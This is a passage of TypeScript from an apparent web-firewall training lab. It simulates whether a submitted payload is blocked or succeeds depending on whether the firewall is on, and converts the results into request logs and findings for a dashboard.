  const vulnIds = config.enabledVulns.filter((vid) => payloadMatchesVuln(payload, vid));
  const matchedVuln = vulnIds.length > 0 ? vulnIds[0] : null;
  const vulnDef = matchedVuln ? VULN_DEFS[matchedVuln] : null;

  const entropy = shannonEntropy(payload);
  const ts = Date.now();

  const headers: Record<string, string> = {
    "Host": "vulnerable-app.local",
    "User-Agent": "Mozilla/5.0 (WebGuard Lab)",
    "Accept": "text/html,application/json",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Forwarded-For": "192.168.1.100",
  };

  const trace: TraceStep[] = [];
  const add = (stage: string, verdict: TraceStep["verdict"], detail: string) =>
    trace.push({ stage, durationUs: randInt(30, 800), verdict, detail });

  add("TLS inspection", "pass", "handshake valid, HTTP/1.1");

  let blocked = false;
  let status: number;
  let responseBody: string;
  let evidence: string;
  let threatScore = 0;

  if (wafOn && matchedVuln && vulnDef) {
    // WAF blocks the attack
    blocked = true;
    add("CRS signature engine", "block", `matched rule for ${vulnDef.label}`);
    add("ML entropy classifier", "info", `${entropy.toFixed(2)} bits/char — below threshold but signature matched`);
    add("Rate-limit budget", "info", "within budget");
    add("WAF enforcement", "block", `dropped with 403 — ${vulnDef.cwe}`);

    const res = vulnDef.blockedResponse(payload);
    status = res.status;
    responseBody = res.body;
    evidence = res.evidence;
    threatScore = randInt(70, 99);
  } else if (matchedVuln && vulnDef) {
    // Attack succeeds (WAF off)
    add("CRS signature engine", "pass", "firewall disabled — no inspection");
    add("ML entropy classifier", "pass", "firewall disabled");
    add("Rate-limit budget", "pass", "firewall disabled");

    const res = vulnDef.exploitResponse(payload);
    status = res.status;
    responseBody = res.body;
    evidence = res.evidence;
    threatScore = randInt(60, 95);
  } else {
    // Benign request
    add("CRS signature engine", "pass", "no signature matched");
    add("ML entropy classifier", "pass", `${entropy.toFixed(2)} bits/char — within bounds`);
    add("Rate-limit budget", "pass", "within budget");

    status = 200;
    responseBody = '{"status":"ok","message":"Request processed normally"}';
    evidence = `→ 200 OK\nNo malicious patterns detected. Normal application response.`;
    threatScore = randInt(2, 15);
  }

  const latencyMs = trace.reduce((s, t) => s + t.durationUs, 0) / 1000 + rand(0.3, 1.5);

  return {
    id: uid("LAB"),
    ts,
    vulnId: (matchedVuln ?? "custom") as VulnId,
    payload,
    wafOn,
    request: { method, path, headers, body: payload },
    response: {
      status,
      headers: blocked
        ? { "X-WebGuard": vulnDef?.id ?? "custom", "X-WebGuard-Action": "blocked" }
        : { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
      body: responseBody,
    },
    evidence,
    blocked,
    threatScore,
    chainId,
    chainStep,
  };
}

/** Convert a lab result to a live-traffic RequestLog for integration */
export function labResultToLog(result: LabAttackResult): RequestLog {
  return {
    id: uid("REQ"),
    ts: result.ts,
    status: result.response.status,
    method: result.request.method,
    path: result.request.path,
    ip: "192.168.1.100",
    countryCode: "US",
    country: "United States",
    lat: 39.03,
    lon: -77.47,
    city: "Lab",
    latency: rand(0.5, 3),
    threatScore: result.threatScore,
    attackType: null,
    ruleId: result.blocked ? `LAB-${result.vulnId.toUpperCase()}` : null,
    blocked: result.blocked,
    throttled: false,
    entropy: shannonEntropy(result.payload),
    ua: "webguard-vuln-lab",
    payload: result.payload,
    matched: result.blocked ? VULN_DEFS[result.vulnId]?.label ?? null : null,
    headers: result.request.headers,
  };
}

/** Convert a lab result to a VulnFinding for integration with Findings tab */
export function labResultToFinding(result: LabAttackResult) {
  const def = VULN_DEFS[result.vulnId];
  return {
    id: uid("FN"),
    title: `${result.blocked ? "Blocked" : "Exploited"}: ${def?.label ?? "Custom Vulnerability"}`,
    severity: (def?.severity ?? "medium") as Severity,
    source: "live" as const,
    status: (result.blocked ? "patched" : "open") as "open" | "investigating" | "patched" | "fixed",
    discoveredAt: result.ts,
    lastSeen: result.ts,
    count: 1,
    evidence: result.evidence,
    patch: def?.wafPatch ?? "Review and apply virtual patch",
    ruleId: result.blocked ? `LAB-${result.vulnId.toUpperCase()}` : null,
    path: result.request.path,
    pillar: null,
  };
}
